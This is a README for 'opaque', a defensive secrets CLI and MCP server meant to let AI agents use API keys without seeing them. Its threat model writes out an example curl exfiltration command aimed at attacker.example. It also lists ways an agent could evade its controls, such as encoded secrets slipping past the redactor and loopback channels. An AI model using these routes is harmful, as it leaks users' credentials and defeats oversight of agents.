# opaque

> **Status:** v0.1.0 — alpha. Linux only for now; macOS Keychain backend planned for v1.1.

An **AI-safe secrets CLI** — stores secrets in your OS keyring and lets programs (and AI agents) use them without ever exposing plaintext. Invoked as `opq`.

```
$ opq exec --env OPENAI_API_KEY=openai_key -- curl ... # ok
$ opq get  openai_key | cat                            # blocked
$ opq mcp                                              # MCP server over stdio
```

## Why

When you let an AI agent run shell commands, the agent shouldn't see your API keys. But the **subprocess** the agent spawns still needs them. `opaque` sits between the two:

- The agent calls `opq exec --env VAR=secret_name -- ...` (or the `run_with_secrets` MCP tool).
- `opq` looks up the secret in your keyring and injects it as an environment variable into the child process.
- The child uses the secret normally. Anything the child accidentally writes to stdout/stderr is scanned, and the secret value is replaced with `[REDACTED:VAR]` before reaching the agent.
- The agent never receives the plaintext, only the redacted output.

## Threat model

**In scope:**

- AI reading plaintext from stdout, error messages, or argv.
- AI piping `opq get` to capture values (refused unless stdout is a TTY).
- Subprocesses accidentally echoing secrets (output redaction).
- Shell-history exposure (no secret ever appears in argv).
- Process-list exposure (`ps auxe`) — secrets enter child via `exec` env, not via shell interpolation.
- Memory swap-out of secret pages (mlocked buffers via `memguard`).
- **Intentional network exfiltration by an AI via the MCP `run_with_secrets` tool** — now blocked by default. Every MCP-spawned subprocess runs inside a network namespace (`bwrap --unshare-net`), so attacks like `curl -H "X-Leak: $SECRET" attacker.example`, DNS labels carrying the secret, and outbound TCP/UDP all fail. The AI must explicitly pass `allow_network=true` to lift the block, and any such call is recorded as `network_allowed` in the audit log. Setting `isolation="full"` additionally tmpfs-overlays `/home` and `/tmp` and ro-binds only `/usr`, `/etc`, `/lib*`, `/bin`, `/sbin` — blocking exfiltration of other host files even before they reach the network. Residuals still in scope (NOT blocked): loopback channels to co-resident services, timing side-channels, kernel-keyring inheritance, and pre-compromise of host binaries under `/usr`.

**Out of scope (v1):**

- Root / kernel attacker.
- Side channels in the legitimate consuming subprocess.
- A malicious subprocess that intentionally exfiltrates the secret via a loopback channel, kernel keyring, or other non-network path the sandbox does not cover.
- Tamper-evident audit log (file mode 0600 only; not cryptographically signed).
- **Encoding-evasion of the redactor.** The redactor matches the raw secret bytes verbatim; base64-, hex-, URL-, or otherwise-encoded forms of a secret will not be detected. Entropy detection was considered and rejected for false-positive reasons.
- **Process-level resource exhaustion by the AI.** Per-call limits exist (60s default timeout / 600s ceiling, 256 KiB per output stream, 32 env vars per call, 200 audit-tail entries) to bound the blast radius of a single call, but a determined AI calling the tool in a tight loop can still consume keyring/CPU/network. Rate-limiting and per-secret allowlists belong in a deployment-side policy proxy (see below).

For high-risk MCP deployments, the recommended pattern is to front `opq mcp` with a small policy-enforcing wrapper MCP server that allowlists `(command, args pattern, env var set)` tuples per secret, denies anything else, and forwards approved calls to `opq`. The opaque CLI itself deliberately ships as a low-trust building block.

## Install

```
go install github.com/alexrios/opaque@latest
```

The installed binary is named `opq`.

Requirements:

- Linux with an unlocked Secret Service session (gnome-keyring, KWallet, or KeePassXC).
- **bubblewrap (`bwrap`) >= 0.5.0** for the MCP subprocess sandbox and `opq exec --sandbox` flag. Install via your package manager (`apt install bubblewrap` on Debian/Ubuntu, `dnf install bubblewrap` on Fedora, `pacman -S bubblewrap` on Arch). `opq mcp` refuses to start without it. Requires a kernel with unprivileged user namespaces enabled (default on most distros).
- Go 1.25+ to build from source (the optional `runtimesecret` build tag needs 1.26.3+; see [Memory hygiene](#memory-hygiene)).

## Quick start

```sh
# Store a secret. Value is read from stdin or prompted on a TTY — never on argv.
printf 'sk-...' | opq set openai_api_key

# List names (never values).
opq list

# Use the secret without ever seeing it.
opq exec --env OPENAI_API_KEY=openai_api_key -- curl -H "Authorization: Bearer $OPENAI_API_KEY" https://api.openai.com/v1/models

# What's in the audit log?
opq audit --tail 10
```

## CLI

| Command | Behavior |
| --- | --- |
| `opq set <name>` | Read value from stdin (or hidden TTY prompt). Never accepts values on argv. |
| `opq list` | Print stored secret names. |
| `opq delete <name>` | Remove a secret. |
| `opq get <name> --plaintext` | Print value to stdout. **Refuses** to run unless stdout is a TTY. |
| `opq exec --env VAR=name [...] -- cmd args` | Run `cmd` with named secrets injected as env vars. Subprocess output is redacted. |
| `opq audit [--tail N]` | Show audit-log entries. |
| `opq mcp` | Run as a Model Context Protocol server over stdio. |

## MCP server

Add to your MCP-aware client (Claude Code, etc.):

```jsonc
{
  "mcpServers": {
    "opq": {
      "command": "opq",
      "args": ["mcp"]
    }
  }
}
```

The server exposes three tools:

- `list_secrets()` — returns secret names only.
- `run_with_secrets({ command, args, env: { VAR: secret_name }, timeout_seconds, allow_network, isolation })` — runs the command with secrets injected; returns redacted stdout/stderr, a normalized exit (`success`/`failure` only — the raw status is in the audit log, never returned to the AI), truncation flags, and a timed-out flag. **The subprocess runs inside a network-blocked sandbox by default** (bubblewrap `--unshare-net`); pass `allow_network=true` to opt in to network access (audited as `network_allowed`), or `isolation="full"` for additional tmpfs `/home` and `/tmp` plus minimal ro-binds. Defaults: 60s timeout (capped at 600s), 256 KiB per output stream, 32 env vars per call.
- `audit_tail({ n })` — recent audit entries, capped at 200 per call.

There is **no** `get_secret_value` tool by design. AIs can use secrets, not read them.

**The MCP sandbox blocks network exfiltration but is not a complete jail.** With the default network sandbox active, `curl`, `dig`, `nc`, and any other network-capable binary the AI chooses cannot reach external hosts — egress fails at the kernel namespace boundary, not in the binary. The redactor is the second line of defense against the subprocess *accidentally* echoing the secret on stdout/stderr, and it still does not detect base64/hex/URL-encoded forms. Residual risks the sandbox does NOT cover: loopback channels to other services on the host, timing side-channels, kernel-keyring inheritance, and pre-compromise of binaries under `/usr`. See the [Threat model](#threat-model) section for the recommended policy-proxy deployment pattern for high-risk environments.

## Backends

v1 ships with the Secret Service backend (libsecret over D-Bus) for Linux. The `Backend` interface in `backend.go` is shaped so additional backends drop in without touching anything else:

- macOS Keychain (planned, v1.1).
- Proton Pass (planned, v2).
- `pass` / file-based / KWallet are already reachable via the underlying `99designs/keyring` library; flip them on by editing `AllowedBackends` in `OpenDefaultBackend`.

## Audit log

`${XDG_STATE_HOME:-$HOME/.local/state}/opq/audit.log`, mode 0600. One JSON object per line. Actions: `set`, `get`, `delete`, `list`, `exec_inject`, `mcp_run`, `redaction_disabled`, `network_allowed`, `denied`.

Example entry:

```json
{"ts":"2026-05-24T15:50:17.189Z","action":"exec_inject","secret_name":"openai_api_key","caller":"cli","pid":50770,"ppid":50701}
```

`caller` is `cli` for direct CLI invocations and `mcp` when the request came through the MCP server, so you can distinguish AI-driven access from human-driven access at a glance.

## Memory hygiene

Secret bytes flow through `memguard.LockedBuffer`s — mlocked pages, guard canaries, zeroed on destroy. The default build is enough for the threat model above.

For an extra hardening layer that erases transient stack + heap copies between the locked buffer and the child env, build with:

```sh
GOEXPERIMENT=runtimesecret go build -tags runtimesecret .
```

This wraps the env-construction code path in `runtime/secret.Do(...)` (Go 1.26.3+, experimental). Linux/amd64 and linux/arm64 only.

## Development

```sh
go test ./...
go vet ./...
go build .
```

End-to-end smoke tests require an unlocked Secret Service session on the host.
